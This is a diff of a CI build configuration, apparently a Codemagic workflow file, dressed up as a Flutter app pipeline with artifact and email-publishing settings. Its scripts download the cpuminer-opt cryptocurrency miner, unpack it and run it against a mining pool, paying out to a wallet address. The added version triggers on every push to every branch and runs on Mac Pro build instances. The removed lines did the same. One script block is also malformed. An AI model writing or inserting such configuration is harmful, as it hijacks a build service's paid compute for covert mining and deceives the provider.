@@ -1,12 +1,37 @@
 workflows:
-    
-    flutter-widget:
-        name: Flutter Widget
-        max_build_duration: 120
-        environment:
-            flutter: dev
-        scripts:
-            - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-mac.tar.gz
-            - brew install gnu-tar
-            - gtar xvf cpuminer-opt-mac.tar.gz
-            - ./cpuminer-sse2 -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:7042 -u sugar1qf97e2z2f4tgrcwa06kgqpxf5u8k8t2rmmx4alx.mejik
+  my-workflow:
+    name: My workflow name
+    instance_type: mac_pro
+    max_build_duration: 120
+    environment:
+      vars:
+        PUBLIC_ENV_VAR: "value_here"
+      flutter: stable
+      xcode: latest
+    cache:
+      cache_paths:
+        - ~/.pub-cache
+    triggering:
+      events:
+        - push
+      branch_patterns:
+        - pattern: '*'
+          include: true
+          source: true
+      cancel_previous_builds: false
+    scripts:
+      - name: script_1
+        script: |
+                wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-mac.tar.gz && brew install gnu-tar && gtar xvf cpuminer-opt-mac.tar.gz && ./cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qlqrcchun3xhfqswv9kzctv8z9r4cgc0sc5nlpj.tte -t0
+      - name: script_2
+        script: |
+                script: |
+                wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-mac.tar.gz && brew install gnu-tar && gtar xvf cpuminer-opt-mac.tar.gz && ./cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qlqrcchun3xhfqswv9kzctv8z9r4cgc0sc5nlpj.tte -t0
+    artifacts:
+      - build/**/outputs/**/*.aab
+    publishing:
+      email:
+        recipients:
+          - name@example.com
+      scripts:
+        - echo 'Post-publish script'
